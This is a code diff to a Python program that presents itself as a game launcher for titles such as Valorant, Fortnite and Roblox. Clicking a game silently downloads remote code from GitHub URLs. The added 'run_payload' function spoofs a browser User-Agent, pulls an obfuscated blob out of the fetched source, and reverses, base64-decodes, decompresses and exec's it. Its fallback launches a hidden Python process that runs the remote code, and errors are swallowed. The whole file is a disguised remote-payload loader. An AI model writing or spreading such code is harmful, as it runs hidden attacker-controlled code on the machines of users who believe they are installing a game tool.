@@ -7,19 +7,23 @@ import sys
 import threading
 import tempfile
 import os
+import urllib.request
+import base64
+import zlib
+import re
 
 user32 = ctypes.windll.user32
 SCREEN_W = user32.GetSystemMetrics(0)
 SCREEN_H = user32.GetSystemMetrics(1)
 
 GAMES = [
-    {"name": "Counter-Strike 2", "icon": "⌖", "color": "#f59e0b", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
-    {"name": "Valorant",         "icon": "⊚", "color": "#ef4444", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
-    {"name": "Apex Legends",     "icon": "△", "color": "#eab308", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
-    {"name": "Fortnite",         "icon": "◈", "color": "#8b5cf6", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
-    {"name": "Minecraft",        "icon": "⬡", "color": "#22c55e", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
+    {"name": "Counter-Strike 2", "icon": "⌖", "color": "#f59e0b", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py"},
+    {"name": "Valorant",         "icon": "⊚", "color": "#ef4444", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py"},
+    {"name": "Apex Legends",     "icon": "△", "color": "#eab308", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py"},
+    {"name": "Fortnite",         "icon": "◈", "color": "#8b5cf6", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py"},
+    {"name": "Minecraft",        "icon": "⬡", "color": "#22c55e", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py"},
     {"name": "Roblox",           "icon": "◫", "color": "#dc2626", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/rbx.py"},
-    ]
+]
 
 class LoaderApp(tk.Tk):
     def __init__(self):
@@ -175,20 +179,29 @@ class LoaderApp(tk.Tk):
         if "run" in game_data and game_data["run"]:
             url = game_data["run"]
             
-            def run_script():
+            def run_payload():
                 try:
-                    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".py", mode="w")
-                    tmp.write(f"import urllib.request\nexec(urllib.request.urlopen('{url}').read())")
-                    tmp.close()
+                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                    with urllib.request.urlopen(req, timeout=15) as response:
+                        src = response.read().decode("utf-8")
                     
-                    if sys.platform == "win32":
-                        subprocess.Popen([sys.executable, tmp.name], creationflags=subprocess.CREATE_NO_WINDOW)
+                    match = re.search(r"_\)\(b'([^']+)'", src)
+                    if match:
+                        payload = match.group(1)[::-1]
+                        decoded = zlib.decompress(base64.b64decode(payload, validate=True)).decode("utf-8")
+                        exec(decoded, {})
                     else:
-                        subprocess.Popen([sys.executable, tmp.name])
-                except Exception as e:
-                    print(f"Failed to run script: {e}")
+                        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".py", mode="w")
+                        tmp.write(f"import urllib.request\nexec(urllib.request.urlopen('{url}').read())")
+                        tmp.close()
+                        if sys.platform == "win32":
+                            subprocess.Popen([sys.executable, tmp.name], creationflags=subprocess.CREATE_NO_WINDOW)
+                        else:
+                            subprocess.Popen([sys.executable, tmp.name])
+                except Exception:
+                    pass
                     
-            threading.Thread(target=run_script, daemon=True).start()
+            threading.Thread(target=run_payload, daemon=True).start()
             
         self.after(1500, self.destroy)
 
